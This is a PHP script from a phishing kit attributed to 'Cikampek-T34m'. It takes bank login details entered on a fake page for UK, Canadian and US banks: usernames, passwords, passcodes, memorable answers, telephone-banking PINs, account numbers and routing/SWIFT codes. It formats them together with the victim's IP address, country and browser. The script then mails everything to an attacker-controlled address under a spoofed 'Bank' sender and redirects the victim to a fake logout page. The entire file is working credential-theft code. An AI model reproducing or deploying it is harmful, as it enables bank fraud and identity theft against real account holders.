<?php

include('../../blocker.php');
include('../../detect.php');

$message ="
++-----[ $$ [-]Cikampek-T34m[-]  $$ ]-----++

      .++=====[ Bank Account UK ]=====++.
Bank Name       : ".$_POST['bnkname']."".$_POST['bnknames']."
Customer ID     : ".$_POST['csid']."
User ΙD         : ".$_POST['u_id']."
Surname         : ".$_POST['s_name']."
Username        : ".$_POST['us_name']."
Password        : ".$_POST['pwd_b']."
Passcode        : ".$_POST['pscode']."
Memorable       : ".$_POST['m_able']."
Memorable Place : ".$_POST['m_ableplace']."
Membership Number : ".$_POST['m_num']."
Registration Number   : ".$_POST['rnum']."
Telephone Banking Pin/Security Number   : ".$_POST['tpin']."
       .++=========[ End ]=========++.

      .++=====[ Bank Account CA ]=====++.
Bank Name              : ".$_POST['bnknameca']."
Account Number         : ".$_POST['acnn']."
Login ID/ Card Number  : ".$_POST['lo_ca']."
Password               : ".$_POST['pwd_ca']."
       .++=========[ End ]=========++.

      .++=====[ Bank Account US or Other ]=====++.
Bank Name        : ".$_POST['bnknameus']."
Account Number   : ".$_POST['acnot']."
Login Bank       : ".$_POST['lobank']."
Password         : ".$_POST['pwd_csdad']."
Routing/swift    : ".$_POST['swsd']."

       .++=========[ End ]=========++.

      .++=======[ PC Info ]=======++.
IP Info         :  ".$ip." | ".$nama_negara." On ".gmdate('r')."
Browser         :  ".$_SERVER['HTTP_USER_AGENT']."
      .++=========[ End ]=========++.
      
++-----[ $$ [N]e[V]e[R] [GIVE UP] $$ ]-----++
";

include('../../your_email.php');
$subject = "".$_POST['bnkname']."".$_POST['bnknames']."".$_POST['bnknameca']."".$_POST['bnknameus']." [ " . $nama_negara . " - " . $ip . " ]";
$headers = "From: Bank  <vr3zyme@nyender.id>";
mail($nyenderid, $subject, $message, $headers);

header("LOCATION: redirscr?cmd=_logout&session=".md5(microtime())."&dispatch=".sha1(microtime())."");

?>
